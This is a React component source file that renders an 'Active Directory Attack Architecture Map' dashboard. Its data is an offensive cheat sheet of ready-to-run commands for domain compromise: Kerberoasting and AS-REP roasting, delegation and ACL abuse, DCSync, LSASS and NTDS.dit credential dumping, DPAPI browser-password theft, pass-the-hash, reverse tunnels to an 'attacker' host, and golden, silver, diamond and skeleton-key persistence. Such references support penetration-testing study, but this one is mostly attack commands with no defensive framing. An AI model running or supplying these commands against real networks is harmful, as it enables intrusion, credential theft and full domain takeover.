import { Box, Flex, Text, SimpleGrid } from '@chakra-ui/react';

// ── Attack path categories ────────────────────────────────────────────────────
const SECTIONS = [
  {
    id: 'enumeration',
    label: 'Domain Enumeration',
    color: '#4FD1C5',
    icon: '🔭',
    description: 'Map the domain — users, groups, ACLs, trusts, GPOs',
    nodes: [
      {
        title: 'BloodHound / SharpHound',
        detail: 'Collect domain objects, sessions, ACLs, trusts. Ingest into Neo4j. Run pre-built or custom Cypher queries to find shortest attack paths.',
        cmd: '.\\SharpHound.exe -c All --zipfilename out.zip\nbloohound-python -c All -u user -p pass -d domain.com -dc dc01\n// Shortest path to Domain Admins\nMATCH p=shortestPath((u:User)-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.COM"})) RETURN p',
      },
      {
        title: 'LDAP Enumeration',
        detail: 'Enumerate users, groups, SPNs, ASREPRoastable accounts, password policies, trusts via raw LDAP queries.',
        cmd: 'ldapsearch -x -H ldap://dc01 -b "DC=domain,DC=com" "(objectClass=user)" sAMAccountName\npython3 ldapdomaindump.py -u "domain\\user" -p pass dc01.domain.com\nGet-ADUser -Filter * -Properties * | Select SamAccountName,PasswordLastSet,Enabled',
      },
      {
        title: 'PowerView Recon',
        detail: 'Enumerate domain objects, find local admins, map sessions to locate high-value targets.',
        cmd: 'Get-DomainUser -SPN | Select SamAccountName,ServicePrincipalName\nGet-DomainGroupMember "Domain Admins"\nFind-LocalAdminAccess -Verbose\nGet-NetLoggedon -ComputerName dc01.domain.com',
      },
    ],
  },
  {
    id: 'kerberos-attacks',
    label: 'Kerberos Attacks',
    color: '#F6AD55',
    icon: '🎫',
    description: 'Abuse Kerberos for credential theft and privilege escalation',
    nodes: [
      {
        title: 'Kerberoasting',
        detail: 'Request TGS tickets for service accounts with SPNs. Crack offline with hashcat. Target accounts with weak passwords / high privileges.',
        cmd: '.\\Rubeus.exe kerberoast /outfile:hashes.kirbi\npython3 GetUserSPNs.py domain/user:pass -dc-ip dc01 -request -outputfile spn.txt\nhashcat -m 13100 spn.txt /usr/share/wordlists/rockyou.txt',
      },
      {
        title: 'AS-REP Roasting',
        detail: 'Request AS-REP for accounts with "Do not require Kerberos pre-authentication". No creds needed. Crack offline.',
        cmd: '.\\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt\npython3 GetNPUsers.py domain/ -dc-ip dc01 -usersfile users.txt -format hashcat\nhashcat -m 18200 asrep.txt rockyou.txt',
      },
      {
        title: 'Unconstrained Delegation',
        detail: 'Machines with unconstrained delegation cache TGTs of authenticating users. Combine with SpoolSample / PrinterBug to coerce DC authentication.',
        cmd: 'Get-DomainComputer -Unconstrained | Select DNSHostName\n.\\SpoolSample.exe dc01.domain.com unconstrained.domain.com\n.\\Rubeus.exe monitor /interval:5 /targetuser:DC01$\n.\\Rubeus.exe ptt /ticket:<base64>',
      },
      {
        title: 'Constrained Delegation',
        detail: 'Abuse S4U2Self + S4U2Proxy to impersonate any user to allowed services. Requires control of delegating account.',
        cmd: 'Get-DomainUser -TrustedToAuth | Select SamAccountName,msds-allowedtodelegateto\n.\\Rubeus.exe s4u /user:svc_account /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/target /ptt',
      },
      {
        title: 'Resource-Based Constrained Delegation (RBCD)',
        detail: 'Write msDS-AllowedToActOnBehalfOfOtherIdentity on a computer object. Requires GenericWrite / GenericAll on target. Create fake computer, abuse RBCD.',
        cmd: 'Set-DomainObject target$ -Set @{\'msds-allowedtoactonbehalfofotheridentity\'=...}\n.\\Rubeus.exe s4u /user:FAKECOMPUTER$ /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/target /ptt',
      },
    ],
  },
  {
    id: 'acl-abuse',
    label: 'ACL / Object Abuse',
    color: '#9F7AEA',
    icon: '🔐',
    description: 'Leverage misconfigured ACLs and object attributes',
    nodes: [
      {
        title: 'GenericAll / GenericWrite',
        detail: 'Full control or write access to an object. Can set password, add to groups, write SPNs for Kerberoasting, set RBCD, enable AS-REP.',
        cmd: '# Set password on user with GenericAll\nSet-DomainUserPassword -Identity target_user -AccountPassword (ConvertTo-SecureString "Pass@123" -AsPlainText -Force)\n# Add user to group with GenericWrite\nAdd-DomainGroupMember -Identity "Domain Admins" -Members attacker',
      },
      {
        title: 'WriteDACL / WriteOwner',
        detail: 'WriteDACL lets you add ACE entries (grant yourself GenericAll). WriteOwner lets you take ownership then modify permissions.',
        cmd: 'Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity attacker -Rights All\nSet-DomainObjectOwner -Identity target -OwnerIdentity attacker',
      },
      {
        title: 'DCSync (DS-Replication-Get-Changes)',
        detail: 'Replicate domain credentials as if you were a DC. Requires GetChanges + GetChangesAll on domain object. Dumps all NTLM hashes.',
        cmd: 'lsadump::dcsync /domain:domain.com /user:Administrator\npython3 secretsdump.py domain/user:pass@dc01 -just-dc-ntlm\npython3 secretsdump.py -hashes :HASH domain/user@dc01',
      },
      {
        title: 'Shadow Credentials',
        detail: 'Write msDS-KeyCredentialLink on an object to add a key credential. Authenticate with PKINIT to obtain TGT/NTLM without knowing the password.',
        cmd: '.\\Whisker.exe add /target:TargetUser\n.\\Rubeus.exe asktgt /user:TargetUser /certificate:cert.pfx /password:pfxpass /getcredentials',
      },
    ],
  },
  {
    id: 'credential-access',
    label: 'Credential Dumping',
    color: '#FC8181',
    icon: '🔑',
    description: 'Extract credentials from memory, disk and domain',
    nodes: [
      {
        title: 'LSASS Credential Extraction',
        detail: 'Dump LSASS memory for plaintext passwords, NTLM hashes, Kerberos tickets. Use multiple methods to evade AV/EDR.',
        cmd: '# Mimikatz in-memory\nsekurlsa::logonpasswords\n# comsvcs.dll (LOLBin)\ntasklist | findstr lsass\nrundll32 C:\\windows\\system32\\comsvcs.dll, MiniDump LSASS_PID dump.bin full\n# Procdump\nprocdump64.exe -accepteula -ma lsass.exe lsass.dmp',
      },
      {
        title: 'NTDS.dit Extraction',
        detail: 'Active Directory database containing all domain credentials. Extract via Volume Shadow Copy or direct domain controller access.',
        cmd: '# Via ntdsutil (requires DA)\nntdsutil "ac in ntds" "ifm" "cr fu c:\\temp\\ntds" q q\n# Via VSS (Shadow Copy)\nvssadmin create shadow /for=C:\\\nrobocopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopyX\\Windows\\NTDS .\\ NTDS.dit\npython3 secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL',
      },
      {
        title: 'DPAPI Secrets',
        detail: 'Decrypt Windows DPAPI blobs — saved browser passwords, WiFi credentials, Windows Credential Manager, RDP saved passwords.',
        cmd: 'dpapi::chrome /in:"%localappdata%\\Google\\Chrome\\User Data\\Default\\Login Data" /unprotect\ndpapi::cred /in:C:\\Users\\user\\AppData\\Roaming\\Microsoft\\Credentials\\HASH\nmimikatz # vault::cred /patch',
      },
    ],
  },
  {
    id: 'lateral-movement',
    label: 'Lateral Movement',
    color: '#68D391',
    icon: '↔️',
    description: 'Move across the network using obtained credentials',
    nodes: [
      {
        title: 'Pass-the-Hash / Pass-the-Ticket',
        detail: 'Authenticate using NTLM hashes (PTH) or Kerberos tickets (PTT) without knowing the plaintext password.',
        cmd: 'crackmapexec smb 10.10.0.0/24 -u admin -H NTLMHASH\npython3 wmiexec.py -hashes :HASH domain/user@target\n.\\Rubeus.exe ptt /ticket:base64ticket\nmimikatz # kerberos::ptt ticket.kirbi',
      },
      {
        title: 'Remote Code Execution',
        detail: 'Execute commands remotely using SMB, WMI, WinRM, scheduled tasks or service creation.',
        cmd: 'python3 psexec.py domain/user:pass@target\npython3 wmiexec.py domain/user:pass@target\nevil-winrm -i target -u user -p pass\ncrackmapexec smb target -u user -p pass -x "whoami"',
      },
      {
        title: 'Pivoting & Tunnelling',
        detail: 'Route traffic through compromised hosts to reach segmented networks using SOCKS proxies, port forwards, or VPN tunnels.',
        cmd: '# ligolo-ng\n./agent -connect attacker:11601 -ignore-cert\n# Chisel\n./chisel server -p 8000 --reverse  # attacker\n./chisel client attacker:8000 R:socks  # victim\n# Proxychains\nproxychains4 -q crackmapexec smb 10.20.0.0/24 ...',
      },
    ],
  },
  {
    id: 'domain-dominance',
    label: 'Domain Dominance',
    color: '#FBD38D',
    icon: '👑',
    description: 'Achieve and maintain full domain / forest compromise',
    nodes: [
      {
        title: 'Golden Ticket',
        detail: 'Forge TGTs using the krbtgt hash. Valid for any user/group for 10 years (default). Persists even after password resets (need 2x krbtgt rotation).',
        cmd: 'lsadump::dcsync /domain:domain.com /user:krbtgt\nkerberos::golden /user:Administrator /domain:domain.com /sid:S-1-5-21-... /krbtgt:HASH /id:500 /ptt\n# Or with Rubeus\n.\\Rubeus.exe golden /rc4:KRBTGT_HASH /domain:domain.com /sid:DOMAIN_SID /user:Administrator /ptt',
      },
      {
        title: 'Silver Ticket',
        detail: 'Forge TGS for specific service using the service account hash. No DC communication needed. Harder to detect.',
        cmd: 'kerberos::golden /user:Administrator /domain:domain.com /sid:S-1-5-21-... /target:server.domain.com /service:cifs /rc4:SERVICE_HASH /ptt',
      },
      {
        title: 'Diamond Ticket',
        detail: 'Request legitimate TGT then modify PAC to include extra groups (e.g., Domain Admins). Evades Golden Ticket detection (ticket is real).',
        cmd: '.\\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /krbkey:KRBTGT_AES256 /domain:domain.com /dc:dc01 /ptt',
      },
      {
        title: 'Skeleton Key',
        detail: 'Patch LSASS on DC with a master password that works for all domain accounts without changing existing passwords. Non-persistent — survives until DC reboot.',
        cmd: 'misc::skeleton\n# Now authenticate as any user with password "mimikatz"\nnet use \\\\dc01 /user:Administrator mimikatz',
      },
      {
        title: 'Cross-Forest / Trust Attacks',
        detail: 'Abuse inter-forest trust relationships to pivot from one forest to another using trust keys or SID history injection.',
        cmd: 'lsadump::trust /patch\nkerberos::golden /user:Administrator /domain:source.com /sid:SOURCE_SID /sids:TARGET_ENTERPRISE_ADMIN_SID /rc4:TRUST_KEY /service:krbtgt /target:target.com /ticket:cross.kirbi',
      },
    ],
  },
];

const NodeCard = ({ node, color }) => (
  <Box
    bg="rgba(0,0,0,0.2)" border={`1px solid ${color}20`}
    borderRadius="10px" p={3} mb={3}
  >
    <Text fontSize="12px" fontWeight="bold" color="var(--dash-text-primary)" mb={1}>
      {node.title}
    </Text>
    <Text fontSize="11px" color="var(--dash-text-secondary)" mb={2} lineHeight="tall">
      {node.detail}
    </Text>
    <Box bg="rgba(0,0,0,0.4)" borderRadius="7px" p={2.5}
      border="1px solid rgba(255,255,255,0.05)">
      <Text fontFamily="mono" fontSize="10px" color="#a5f3fc" whiteSpace="pre-wrap" lineHeight="tall">
        {node.cmd}
      </Text>
    </Box>
  </Box>
);

const SectionCard = ({ section }) => (
  <Box
    bg="var(--dash-card-bg)" border="1px solid var(--dash-card-border)"
    borderRadius="12px" overflow="hidden"
  >
    <Box h="3px" bg={section.color} />
    <Box p={4}>
      <Flex align="center" gap={2} mb={1}>
        <Text fontSize="15px">{section.icon}</Text>
        <Text fontSize="13px" fontWeight="bold" color="var(--dash-text-primary)">
          {section.label}
        </Text>
      </Flex>
      <Text fontSize="11px" color="var(--dash-text-muted)" mb={4}>{section.description}</Text>
      {section.nodes.map((n, i) => <NodeCard key={i} node={n} color={section.color} />)}
    </Box>
  </Box>
);

const ADAttackMapView = () => (
  <Box pb={8}>
    <Box mb={6}>
      <Text fontSize="2xl" fontWeight="bold" color="var(--dash-text-primary)">
        Active Directory <Text as="span" color="red.400">Attack Architecture Map</Text>
      </Text>
      <Text fontSize="12px" color="var(--dash-text-secondary)" mt={1}>
        From initial foothold to full domain compromise — enumeration, Kerberos abuse, ACL exploitation & persistence
      </Text>
    </Box>

    {/* Attack path overview */}
    <Box
      bg="var(--dash-card-bg)" border="1px solid var(--dash-card-border)"
      borderRadius="12px" p={4} mb={6}
    >
      <Text fontSize="9px" color="var(--dash-text-muted)" textTransform="uppercase"
        letterSpacing="wider" mb={3}>Attack Path Overview</Text>
      <Flex gap={2} flexWrap="wrap" align="center">
        {[
          { label: 'Foothold', color: '#FC8181' },
          { label: '→', color: '#555' },
          { label: 'Enumeration', color: '#4FD1C5' },
          { label: '→', color: '#555' },
          { label: 'Kerberos Abuse', color: '#F6AD55' },
          { label: '→', color: '#555' },
          { label: 'ACL Abuse', color: '#9F7AEA' },
          { label: '→', color: '#555' },
          { label: 'Cred Dump', color: '#FC8181' },
          { label: '→', color: '#555' },
          { label: 'Lateral Move', color: '#68D391' },
          { label: '→', color: '#555' },
          { label: 'Domain Admin', color: '#FBD38D' },
          { label: '→', color: '#555' },
          { label: 'Forest Dominance', color: '#F687B3' },
        ].map((item, i) =>
          item.label === '→'
            ? <Text key={i} fontSize="14px" color="var(--dash-text-muted)">→</Text>
            : <Box key={i} px={3} py="4px" borderRadius="6px"
                bg={`${item.color}18`} border={`1px solid ${item.color}35`}>
                <Text fontSize="10px" fontWeight="bold" color={item.color}>{item.label}</Text>
              </Box>
        )}
      </Flex>
    </Box>

    {/* Key tools row */}
    <Box
      bg="var(--dash-card-bg)" border="1px solid var(--dash-card-border)"
      borderRadius="12px" p={4} mb={6}
    >
      <Text fontSize="9px" color="var(--dash-text-muted)" textTransform="uppercase"
        letterSpacing="wider" mb={3}>Core Toolset</Text>
      <Flex gap={2} flexWrap="wrap">
        {[
          ['BloodHound', '#4FD1C5'], ['SharpHound', '#4FD1C5'], ['Impacket', '#FC8181'],
          ['Rubeus', '#F6AD55'], ['Mimikatz', '#FBD38D'], ['CrackMapExec', '#68D391'],
          ['PowerView', '#9F7AEA'], ['Responder', '#FC8181'], ['ntlmrelayx', '#FC8181'],
          ['Certipy', '#F687B3'], ['Whisker', '#ECC94B'], ['ligolo-ng', '#76E4F7'],
        ].map(([tool, color]) => (
          <Box key={tool} px="8px" py="2px" borderRadius="5px" fontSize="10px" fontWeight="semibold"
            bg={`${color}14`} border={`1px solid ${color}30`} color={color}>
            {tool}
          </Box>
        ))}
      </Flex>
    </Box>

    <SimpleGrid columns={{ base: 1, lg: 2 }} gap={4}>
      {SECTIONS.map((s) => <SectionCard key={s.id} section={s} />)}
    </SimpleGrid>
  </Box>
);

export default ADAttackMapView;
